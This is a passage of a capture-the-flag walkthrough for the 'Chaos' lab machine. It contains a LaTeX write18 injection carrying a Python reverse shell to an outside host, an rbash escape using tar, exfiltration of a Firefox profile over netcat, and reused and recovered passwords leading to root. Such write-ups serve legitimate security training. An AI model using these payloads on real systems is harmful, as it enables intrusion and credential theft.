  This is pdfTeX, Version 3.14159265-2.6-1.40.19 (TeX Live 2019/dev/Debian) (preloaded format=pdflatex)
   \write18 enabled.
  entering extended mode
  ...omitted...
  ...uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ...omitted...
</span></code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li><code class="highlighter-rouge">\immediate\write18{id}</code> executed
        <blockquote>

        </blockquote>
      </li>
    </ul>
  </li>
  <li>Set-up Reverse Shell:
    <ul>
      <li>Local Terminal #1:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-lvp</span> 4444
</code></pre></div>        </div>
      </li>
      <li>Local Terminal #2:
        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ cmd</span><span class="o">=</span><span class="s2">"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="se">\"</span><span class="s2">10.10.12.70</span><span class="se">\"</span><span class="s2">,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span class="se">\"</span><span class="s2">/bin/sh</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">-i</span><span class="se">\"</span><span class="s2">]);'"</span>

<span class="nv">$ </span>curl <span class="nt">-d</span> <span class="s2">"content=</span><span class="se">\i</span><span class="s2">mmediate</span><span class="se">\w</span><span class="s2">rite18{</span><span class="nv">$cmd</span><span class="s2">}&amp;template=test1"</span> http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php
</code></pre></div>        </div>
      </li>
      <li><code class="highlighter-rouge">netcat</code> listener:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">python -c 'import pty;</span><span class="w"> </span>pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="s1">'
</span><span class="go">
cat /etc/passwd | grep bash
</span><span class="gp">#</span><span class="w"> </span>root:x:0:0:root:/root:/bin/bash
<span class="gp">#</span><span class="w"> </span>sahay:x:1000:1000:choas:/home/sahay:/bin/bash
<span class="gp">#</span><span class="w"> </span>ayush:x:1001:1001:,,,:/home/ayush:/opt/rbash
</code></pre></div>        </div>
      </li>
    </ul>

    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>The user, <code class="highlighter-rouge">ayush</code>, has a <strong>restricted shell</strong> (<code class="highlighter-rouge">/opt/rbash</code>)
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>su ayush
<span class="go">
  Password: jiujitsu
     
</span><span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">
  rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names

</span></code></pre></div>        </div>
        <ul>
          <li><code class="highlighter-rouge">ayush</code> <strong>reuses</strong> passwords
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Escape the <code class="highlighter-rouge">rbash</code>:
    <ol>
      <li>Look for usable commands:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> ~
<span class="go">
  rbash: cd: restricted

</span><span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-lah</span>
<span class="go">
  rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names

</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo test</span>
<span class="go">      
  test

</span></code></pre></div>        </div>
      </li>
      <li>Leverage <code class="highlighter-rouge">echo</code>:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> ~/<span class="k">*</span>
<span class="go">
  /home/ayush/mail 
  /home/ayush/user.txt

</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nv">$PATH</span>
<span class="go">
  /home/ayush/.app

</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> /home/ayush/.app/<span class="k">*</span>
<span class="go">
  /home/ayush/.app/dir 
  /home/ayush/.app/ping 
  /home/ayush/.app/tar

</span></code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li><code class="highlighter-rouge">ayush</code> is able to use <code class="highlighter-rouge">tar</code>
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
      <li>Leverage <code class="highlighter-rouge">tar</code>:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">tar</span> <span class="nt">-cf</span> /dev/null /home/ayush/mail <span class="nt">--checkpoint</span><span class="o">=</span>1 <span class="nt">--checkpoint-action</span><span class="o">=</span><span class="nb">exec</span><span class="o">=</span>/bin/sh
<span class="go">
</span><span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/bin:/usr/bin:<span class="nv">$PATH</span>
</code></pre></div>        </div>
      </li>
    </ol>
  </li>
  <li>Spawn a <strong>tty shell</strong>:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
<span class="gp">&gt;</span><span class="w"> </span>Ctrl + z
<span class="gp">$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span>
<span class="gp">$</span><span class="w"> </span><span class="nb">fg</span>
<span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
<span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
</code></pre></div>    </div>
  </li>
  <li>Find <code class="highlighter-rouge">user.txt</code>:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /home/ayush/user.txt
<span class="go">    
  eef39126d9c3b4b8a30286970dc713e1

</span></code></pre></div>    </div>
  </li>
</ol>

<hr />

<h2 id="part-5--privilege-escalation-ayush---root">PART 5 : PRIVILEGE ESCALATION (ayush -&gt; root)</h2>

<ol>
  <li>While inside <code class="highlighter-rouge">ayush</code> shell:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-lah</span> ~
<span class="go">
  total 40K
  drwx------ 6 ayush ayush 4.0K May 26 09:24 .
  drwxr-xr-x 4 root  root  4.0K Oct 28  2018 ..
  drwxr-xr-x 2 root  root  4.0K Oct 28  2018 .app
  -rw------- 1 root  root     0 Nov 24 23:57 .bash_history
  -rw-r--r-- 1 ayush ayush  220 Oct 28  2018 .bash_logout
  -rwxr-xr-x 1 root  root    22 Oct 28  2018 .bashrc
  drwx------ 3 ayush ayush 4.0K May 26 09:24 .gnupg
  drwx------ 3 ayush ayush 4.0K May 26 09:57 mail
  drwx------ 4 ayush ayush 4.0K Sep 29  2018 .mozilla
  -rw-r--r-- 1 ayush ayush  807 Oct 28  2018 .profile
 -rw------- 1 ayush ayush   33 Oct 28  2018 user.txt

</span><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> .mozilla/firefoz
<span class="go">
</span><span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-lah</span>
<span class="go">
  total 20K
  drwx------  4 ayush ayush 4.0K Sep 29  2018  .
  drwx------  4 ayush ayush 4.0K Sep 29  2018  ..
  drwx------ 10 ayush ayush 4.0K Oct 27  2018  bzo7sjt1.default
  drwx------  4 ayush ayush 4.0K Oct 15  2018 'Crash Reports'
  -rw-r--r--  1 ayush ayush  104 Sep 29  2018  profiles.ini

</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>profiles.ini
<span class="go">
  [General]
  StartWithLastProfile=1
     
  [Profile0]
  Name=default
  IsRelative=1
  Path=bzo7sjt1.default
  Default=1

</span></code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li><code class="highlighter-rouge">profiles.ini</code> contains firefox profile
        <ul>
          <li>The <code class="highlighter-rouge">Path</code> is the directory containing relevant files to the profiles</li>
          <li>Profiles may contain <strong>saved logins</strong> by the user
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Export <code class="highlighter-rouge">bzo7sjt1.default</code>:
    <ul>
      <li>Local terminal:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-lvp</span> 1234 <span class="o">&gt;</span> profile.tar
</code></pre></div>        </div>
      </li>
      <li><code class="highlighter-rouge">ayush</code> terminal:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">tar</span> <span class="nt">-cf</span> /tmp/something ~/.mozilla/firefox/bzo7sjt1.default
<span class="go">
</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /tmp/something | nc 10.10.12.70 1234
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
  <li>Extract <code class="highlighter-rouge">profile.tar</code> and start a firefox isntance
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">mkdir </span>bzo7sjt1.default
<span class="gp">$</span><span class="w"> </span><span class="nb">cd </span>bzo7sjt1.default
<span class="gp">$</span><span class="w"> </span><span class="nb">tar</span> <span class="nt">-xvf</span> ../profile.tar
<span class="gp">$</span><span class="w"> </span>firefox <span class="nt">--profile</span> ./
</code></pre></div>    </div>
  </li>
  <li>Find <strong>saved logins</strong>:
    <ol>
      <li>Go to <code class="highlighter-rouge">Options</code></li>
      <li>Go to <code class="highlighter-rouge">Privacy &amp; Security</code></li>
      <li>Look for <code class="highlighter-rouge">Saved Logins...</code></li>
      <li>Enter the <strong>master password</strong> (â<code class="highlighter-rouge">jiujitsu</code>â)</li>
      <li>Click <code class="highlighter-rouge">Show Passwords</code></li>
      <li>Enter the <strong>master password</strong> (â<code class="highlighter-rouge">jiujitsu</code>â) again</li>
    </ol>

    <p><img src="./screenshots/22_chaos/10000_chaos_root.png" alt="chaos root" /></p>

    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>The user, <code class="highlighter-rouge">ayush</code>, kept reusing the password <code class="highlighter-rouge">jiujitsu</code></li>
      <li>Credentials for a user, <code class="highlighter-rouge">root</code>, is in the <code class="highlighter-rouge">Saved Logins...</code>
        <ul>
          <li>Credential pair â <code class="highlighter-rouge">root:Thiv8wrej~</code></li>
          <li>Maybe <code class="highlighter-rouge">root</code> is also reusing credentials
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>While inside <code class="highlighter-rouge">ayush</code> shell:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>su root
<span class="gp">$</span><span class="w"> </span>Password: Thiv8wrej~
<span class="go">
</span><span class="gp">#</span><span class="w"> </span><span class="nb">id</span>
<span class="go">
  uid=0(root) gid=0(root) groups=0(root)

</span><span class="gp">#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
<span class="go">
  4eca7e09e3520e020884563cfbabbc70

</span></code></pre></div>    </div>
  </li>
</ol>
:ET